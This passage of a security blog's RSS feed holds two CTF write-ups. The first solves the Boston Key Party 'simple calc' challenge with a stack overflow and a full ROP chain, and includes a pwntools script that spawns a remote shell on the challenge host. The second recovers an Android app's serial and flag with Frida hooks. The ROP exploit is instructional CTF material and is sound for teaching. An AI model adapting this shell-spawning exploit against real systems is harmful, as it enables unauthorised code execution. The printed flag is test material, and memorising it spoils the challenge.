+&lt;p&gt;When you first choose how many calculation to make, an appropriately size buffer is &lt;code&gt;malloc&lt;/code&gt;ed and the result of each is saved. If you decide to quit out early, then the buffer is &lt;code&gt;memcpy&lt;/code&gt;d to a buffer on the stack, which gives us our stack smashing opportunity &amp;ndash; Just select more operations than the stack buffer can fit the results for. This will, however, overwrite the pointer to the alloc&amp;rsquo;d buffer, causing the &lt;code&gt;free&lt;/code&gt; call to crash, but we can easily get around that: &lt;code&gt;free(0)&lt;/code&gt; short circuits and returns, so all we need to do is overwrite the stack will nulls, which we can do by subtracting some number from itself.&lt;/p&gt;
+&lt;p&gt;Now that I have RIP, I need to exploit it. Stack is NX, and I can&amp;rsquo;t find &amp;ldquo;/bin/*sh&amp;rdquo; in a static part of the binary, nor is there a &lt;code&gt;system&lt;/code&gt;. This rules out ret2libc, and we will have to do a ROP.&lt;/p&gt;
+&lt;p&gt;This was my first non-trivial ROP (and some would argue it&amp;rsquo;s still trivial), so I will go into how I did it.&lt;/p&gt;
+&lt;p&gt;First I needed to figure out how to make the syscall. I found some simple shellcode &lt;a href=&#34;http://imgur.com/HbgCv5u&#34;&gt;here&lt;/a&gt;, and figured out what it was doing:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Set AL to 0x3B&lt;/li&gt;
+&lt;li&gt;Set RDX to NULL&lt;/li&gt;
+&lt;li&gt;Set RDI to point to &amp;ldquo;/bin/sh\0&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;Set RSI to point to a pointer to &amp;ldquo;/bin/sh\0&amp;rdquo; followed by NULL.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Since we are on x86_64, this requires two &amp;lsquo;operations&amp;rsquo; so that we write eight bytes. This also gives us another problem: The stack location is unpredictable, where do we put this arg array and string? Lucky for us, we have easily controllable global vars. Once we set up the ROP chain on the stack, we can re-run dummy operations to overwrite the global &amp;lsquo;cache&amp;rsquo; of operands and results.&lt;/p&gt;
+&lt;p&gt;To do this I simply &amp;lsquo;divided&amp;rsquo; &amp;ldquo;/bin&amp;rdquo; by &amp;ldquo;/sh\0&amp;rdquo;, which puts &amp;ldquo;/bin/sh\0&amp;rdquo; at the &lt;code&gt;divv&lt;/code&gt; symbol. For the array, it was a bit trickier: I needed something with 12 NULL bytes after (4 to cover the second half of the pointer, and 8 more for the second elements). Since &lt;code&gt;sub&lt;/code&gt; was at the end, I could do this. I put the address of &lt;code&gt;divv&lt;/code&gt; as both operands of a sub operation, which would result in a NULL result, plus the four bytes following would be NULL (since the section is .bss). Unfortunately I hit another problem: In practice, a symbol soon after the sub result, &lt;code&gt;_dl_tls_static_used&lt;/code&gt; was set to 0x60. To get around this, I would need an extra ROP gadget to write over this value with 0.&lt;/p&gt;
+&lt;p&gt;In the end, I ended up with what I think is a pretty elegant solution:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; struct
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;write_addr&lt;/span&gt;(addr):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ADD &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(addr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;40&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; NULL
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Commands&lt;/span&gt;
+ADD &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+SUB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+MUL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+DIV &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+DONE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+NULL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SUB&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;40&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;40&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Gadgets&lt;/span&gt;
+POP_RDI &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00401b73&lt;/span&gt;)
+POP_RAX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0044db34&lt;/span&gt;)
+POP_RDX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00437a85&lt;/span&gt;)
+POP_RSI &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00401c87&lt;/span&gt;)
+MOV_EDX_TO_AT_RAX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0044526f&lt;/span&gt;)
+SYSCALL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; write_addr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x004648e5&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;# Globals&lt;/span&gt;
+addX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C4A80&lt;/span&gt;
+addY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addX &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+addRes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addY &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+divX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addRes &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+divY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; divX &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+divRes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; divY &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+mulX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; divRes &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+mulY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mulX &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+mulRes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mulY &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+subX &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mulRes &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+subY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; subX &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+subRes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; subY &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+_dl_tls_static_used &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C4AC0&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Build commands&lt;/span&gt;
+commands &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;100&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,  &lt;span style=&#34;color:#75715e&#34;&gt;# Any large number&lt;/span&gt;
+    NULL&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,  &lt;span style=&#34;color:#75715e&#34;&gt;# Get to RA&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Set _dl_tls_static_used to 0&lt;/span&gt;
+    POP_RAX,
+    write_addr(_dl_tls_static_used),
+    POP_RDX,
+    NULL, NULL,
+    MOV_EDX_TO_AT_RAX,
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Now get ready for syscall&lt;/span&gt;
+    POP_RDI,
+    write_addr(divX),  &lt;span style=&#34;color:#75715e&#34;&gt;# divX holds the string &amp;#34;/bin/sh&amp;#34;&lt;/span&gt;
+    POP_RAX,
+    SUB &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3b&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4096&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; NULL,  &lt;span style=&#34;color:#75715e&#34;&gt;# 0x3b = execve&lt;/span&gt;
+    POP_RDX,
+    NULL, NULL,  &lt;span style=&#34;color:#75715e&#34;&gt;# RDX should be null&lt;/span&gt;
+    POP_RSI,  &lt;span style=&#34;color:#75715e&#34;&gt;# RSI should point to an array that has a pointer to &amp;#34;/bin/sh&amp;#34; and a null pointer&lt;/span&gt;
+    write_addr(subY),
+    SYSCALL,
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Now we need to populate the global vars by running extra calcs&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# -- Put &amp;#34;/bin/sh&amp;#34; at addX&lt;/span&gt;
+    DIV &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;I&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,
+    str(struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;I&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,
+    &lt;span style=&#34;color:#75715e&#34;&gt;# -- Put pointer to divX at subY with null after&lt;/span&gt;
+    SUB &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(divX) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(divX) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,
+    DONE
+]
+
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;simplecalc.bostonkey.party&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5400&lt;/span&gt;)
+garbage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv()
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(commands))
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+- https://grazfather.github.io/posts/2016-03-06-bkp-pwn5-simple-calc/ - </description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Sharif CTF 2016 - RE100 ‘Android App’ Writeup</title>
+        <link>https://grazfather.github.io/posts/2016-02-14-sharif-ctf-re100-android-app-writeup/</link>
+        <pubDate>Sun, 14 Feb 2016 15:00:00 +0000</pubDate>
+        
+        <guid>https://grazfather.github.io/posts/2016-02-14-sharif-ctf-re100-android-app-writeup/</guid>
+        <description>Grazfather https://grazfather.github.io/posts/2016-02-14-sharif-ctf-re100-android-app-writeup/ -&lt;p&gt;This one I didn&amp;rsquo;t actually solve in time, because I spent too much time trying to a) Use &lt;a href=&#34;http://frida.re&#34;&gt;frida&lt;/a&gt; and b) RE the args to the two import functions.&lt;/p&gt;
+&lt;p&gt;Because I am a fan of Frida (first cutting my teeth on it during the 2015 Flare On challenge), I decided I would use it in lieu of a debugger for this challenge (I didn&amp;rsquo;t want to figure out the toolchain to get the lldb client running on my mac).&lt;/p&gt;
+&lt;p&gt;Starting with &lt;code&gt;dex2jar&lt;/code&gt; I took the apk apart and took a quick peek at the two main classes. They use JNI to call into two functions in the provided dynamic library, and then generate the flag based on result. Because one function seeds the Java code to generate the flag, and the other takes the same input, but only returns success, I spent almost no time in Java land and instead went directly into looking at the native code.&lt;/p&gt;
+&lt;p&gt;Loading up the library in IDA, I was a little intimidated because of the unfamiliar ISA and what looked like a parser. I decided to try to do this dynamically, so this is when I decided &lt;code&gt;frida-trace&lt;/code&gt; would be my friend.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://grazfather.github.io/assets/2016-02-14-Sharif-CTF-RE100-Android-App-1.png&#34; alt=&#34;No thanks&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Setting up &lt;code&gt;frida&lt;/code&gt; is very straight forward:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adb install Sharif_CTF.apk
+adb push frida-server /data/local/tmp
+adb shell
+su
+/data/local/tmp/frida-server&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I could then instrument the application and play around with it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;frida-ps -U|grep ctf
+frida-trace -U -p &amp;lt;pid&amp;gt; -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*isCorrect*&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I spent &lt;em&gt;way&lt;/em&gt; more time than I would like to admit here, playing with &lt;code&gt;Memory.read&amp;lt;X&amp;gt;&lt;/code&gt; trying to read out the arguments and return value, but the problem was that this function is provided a Java string, whose structure I am unfamiliar with. Part of the complexity of the native functions are surely just getting the C string out of the &lt;code&gt;String&lt;/code&gt; object, but I didn&amp;rsquo;t feel like figuring that out.&lt;/p&gt;
+&lt;p&gt;If I wanted to see what was going on &lt;em&gt;easily&lt;/em&gt; I&amp;rsquo;d want to find a function that takes C strings, which are easy to read from. Lucky for me, the &lt;code&gt;isCorrect&lt;/code&gt; function imports &lt;code&gt;strcmp&lt;/code&gt; from &lt;em&gt;libc.so&lt;/em&gt;. It can&amp;rsquo;t be that easy&amp;hellip; can it?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://grazfather.github.io/assets/2016-02-14-Sharif-CTF-RE100-Android-App-2.png&#34; alt=&#34;Calling strcmp&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;frida-trace -U -p &amp;lt;pid&amp;gt; -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*strcmp*&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Editing the created &lt;em&gt;strcmp.js&lt;/em&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;onEnter&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;state&lt;/span&gt;) {
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;strcmp(&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Memory&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readUtf8String&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;,&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;Memory&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readUtf8String&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)&amp;#34;&lt;/span&gt;);
+},
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;And then just hitting &amp;lsquo;Login&amp;rsquo; on the app:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2059&lt;/span&gt; ms  strcmp&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Serial Number,ef57f3fe3cf603c03890ee588878c0ec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Now, remember that this isn&amp;rsquo;t the flag, but what is compared against to determine if we have the correct login. We could fake the retval from this function to return true, but that would make the flag generation fail. Instead, just enter &amp;lsquo;ef57f3fe3cf603c03890ee588878c0ec&amp;rsquo; into the prompt, which will be passed to both lib function, which should properly seed the Java code, and see the flag pop out.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://grazfather.github.io/assets/2016-02-14-Sharif-CTF-RE100-Android-App-3.png&#34; alt=&#34;Flag&#34;&gt;&lt;/p&gt;
+&lt;p&gt;flag: Sharif_CTF{833489ef285e6fa80690099efc5d9c9d}&lt;/p&gt;
+- https://grazfather.github.io/posts/2016-02-14-sharif-ctf-re100-android-app-writeup/ - </description>
+        </item>
+    
+    
+  </channel>
+</rss> 
